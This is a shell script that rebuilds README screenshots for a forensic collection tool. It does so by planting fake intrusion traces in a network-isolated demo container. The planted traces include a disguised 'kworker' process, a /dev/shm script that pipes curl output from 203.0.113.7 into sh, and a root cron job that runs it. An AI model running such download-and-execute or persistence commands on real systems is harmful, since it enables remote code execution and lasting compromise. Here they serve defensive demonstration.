#!/bin/sh
# README 화면을 다시 만든다. 데모 컨테이너(호스트 web01, 네트워크 없음)에 가짜 침해 흔적을 심고
# dist/exart-linux-aarch64 로 수집한 출력을 캡처해 SVG 로 그린다. 실제 시스템 정보가 들어가지 않는다.
# 필요: Docker, dist/exart-linux-aarch64 (packaging 참고), python3 + rich
set -eu
HERE=$(cd "$(dirname "$0")/../.." && pwd)
CAP=$(mktemp -d)
trap 'docker rm -f exart-demo >/dev/null 2>&1 || true; rm -rf "$CAP"' EXIT
docker run -d --name exart-demo --platform linux/arm64 --network none --hostname web01 \
  --mount type=tmpfs,dst=/mnt/usb -v "$HERE/dist/exart-linux-aarch64:/opt/exart:ro" -v "$CAP:/cap" \
  ubuntu:22.04 sleep infinity >/dev/null
docker exec exart-demo sh -c '
  mkdir -p /var/tmp/.cache && cp /bin/sleep /var/tmp/.cache/kworker
  (nohup /var/tmp/.cache/kworker 600 >/dev/null 2>&1 &); sleep 1; rm /var/tmp/.cache/kworker
  printf "#!/bin/sh\ncurl -s http://203.0.113.7/x | sh\n" > /dev/shm/.u.sh
  echo "*/5 * * * * root sh /dev/shm/.u.sh" > /etc/cron.d/sysupdate'
docker exec -w /opt/exart exart-demo sh -c '
  P="root@web01:/opt/exart#"
  { echo "$P ./exart-linux-aarch64 --list-modules"; ./exart-linux-aarch64 --list-modules; } > /cap/list.txt 2>&1
  { echo "$P ./exart-linux-aarch64 -o /mnt/usb --case-id IR-2026-001 --since 2026-10-01 -y"
    ./exart-linux-aarch64 -o /mnt/usb --case-id IR-2026-001 --since 2026-10-01 -y; } > /cap/run.txt 2>&1
  d=$(ls -d /mnt/usb/IR-2026-001_*)
  { echo "$P ./exart-linux-aarch64 --verify $d"; ./exart-linux-aarch64 --verify $d; } > /cap/verify.txt 2>&1
  cd $d; Q="root@web01:$d#"
  { echo "$Q ls"; ls -C; echo
    echo "$Q awk -F, '"'"'NR==1 || \$9==\"True\"'"'"' volatile/processes.csv | cut -d, -f1,2,4,7-11"
    awk -F, "NR==1 || \$9==\"True\"" volatile/processes.csv | cut -d, -f1,2,4,7-11; echo
    echo "$Q ls -A files/processes files/suspicious/tmp/dev/shm files/persistence/etc/cron.d"
    ls -A files/processes files/suspicious/tmp/dev/shm files/persistence/etc/cron.d; } > /cap/result.txt 2>&1'
for n in run verify result list; do python3 "$HERE/docs/images/render.py" "$CAP/$n.txt" "$HERE/docs/images/$n.svg" exart; done
